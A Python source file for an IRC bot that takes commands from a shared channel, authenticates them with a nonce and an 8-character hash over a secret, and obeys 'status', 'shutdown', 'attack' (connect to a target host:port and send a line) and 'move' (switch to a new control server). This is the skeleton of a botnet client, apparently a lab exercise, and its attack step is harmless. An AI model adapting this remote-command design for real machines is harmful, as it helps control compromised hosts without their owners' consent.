import hashlib
import random
import re
import socket
import sys
import time
from threading import Thread


class IRCBot:
    def __init__(self, server_address, channel, secret):
        self.server_address = server_address
        self.channel = '#' + channel if not channel.startswith('#') else channel
        self.secret = secret
        self.seen_nonces = set()
        self.command_count = 0
        self.socket = None
        self.running = True
        self.nick = self.generate_nick()
        
    def generate_nick(self):
        return 'bot-' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))
    
    def connect(self):
        host, port = self.server_address.split(':')
        port = int(port)
        
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((host, port))
                print(f"Connected to IRC server {host}:{port}")
                
                # Send IRC registration
                self.send_raw(f'NICK {self.nick}')
                self.send_raw(f'USER {self.nick} 0 * :{self.nick}')
                time.sleep(1)  
                self.send_raw(f'JOIN {self.channel}')
                self.send_message("-joined")
                return True
            except (socket.error, ConnectionRefusedError) as e:
                print(f"Connection failed: {e}. Retrying in 5s...")
                time.sleep(5)
        return False
    
    def send_raw(self, message):
        try:
            self.socket.sendall((message + '\r\n').encode())
        except (socket.error, BrokenPipeError):
            self.reconnect()
    
    def send_message(self, message):
        self.send_raw(f'PRIVMSG {self.channel} :{message}')
    
    def reconnect(self):
        if self.socket:
            self.socket.close()
        print("Disconnected. Reconnecting...")
        self.connect()
    
    def compute_mac(self, nonce):
        data = f"{nonce}{self.secret}".encode()
        return hashlib.sha256(data).hexdigest()[:8]
    
    def authenticate(self, nonce, mac):
        # print(f"\n[DEBUG] Authenticating command:")
        # print(f"Nonce: {nonce}")
        # print(f"Provided MAC: {mac}")
        
        if nonce in self.seen_nonces:
            print(f"Nonce {nonce} already used - rejecting")
            return False
        
        # Compute the expected MAC
        mac_data = f"{nonce}{self.secret}".encode()
        computed_mac = hashlib.sha256(mac_data).hexdigest()[:8]
        
        # Compare MACs
        if computed_mac.lower() != mac.lower():
            print(f"MAC mismatch! Expected {computed_mac}, got {mac}")
            return False
        
        print("Authentication successful!")
        self.seen_nonces.add(nonce)
        return True

    def process_line(self, line):    
        if line.startswith('PING'):
            self.send_raw(line.replace('PING', 'PONG', 1))
            return
        
        # Extract PRIVMSG commands
        privmsg_match = re.match(r':([^!]+)!.* PRIVMSG (\#\w+) :!(.+)', line)
        if privmsg_match:
            channel = privmsg_match.group(2)
            if channel.lower() == self.channel.lower():
                full_command = privmsg_match.group(3)
                print(f"Processing command: {full_command}")
                self.handle_command(full_command) 

    def handle_command(self, command):
        parts = command.split()
        if len(parts) < 3:
            print("Invalid command format")
            return
            
        nonce, mac, cmd = parts[0], parts[1], parts[2]
        args = parts[3:] if len(parts) > 3 else []
        
        print(f"Command parts - Nonce: {nonce}, MAC: {mac}, Command: {cmd}, Args: {args}")
        
        if not self.authenticate(nonce, mac):
            print(f"Authentication failed for {cmd}")
            return
            
        self.command_count += 1
        print(f"Executing authenticated command: {cmd} {args}")
        
        if cmd == "status":
            self.send_message(f"-status {self.command_count}")
        elif cmd == "shutdown":
            self.send_message("-shutdown")
            self.running = False
        elif cmd == "attack" and len(args) == 1:
            self.handle_attack(nonce, args[0])
        elif cmd == "move" and len(args) == 1:
            self.handle_move(args[0])
        
    def handle_attack(self, nonce, target):
        try:
            host, port = target.split(':')
            with socket.create_connection((host, int(port)), timeout=3) as s:
                s.sendall(f"{self.nick} {nonce}\n".encode())
            self.send_message(f"-attack OK")
        except Exception as e:
            self.send_message(f"-attack FAIL {str(e)}")
    
    def handle_move(self, new_server):
        self.send_message("-move")
        self.server_address = new_server
        self.reconnect()
    
    def run(self):
        if not self.connect():
            return
            
        buffer = ""
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    raise ConnectionError("Server disconnected")
                
                buffer += data
                lines = buffer.split('\n')
                buffer = lines.pop() if lines else ""
                
                for line in lines:
                    self.process_line(line.strip())
            except Exception as e:
                print(f"Error: {e}")
                self.reconnect()

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <hostname:port> <channel> <secret>")
        sys.exit(1)
    
    bot = IRCBot(sys.argv[1], sys.argv[2], sys.argv[3])
    bot.run()

if __name__ == "__main__":
    main()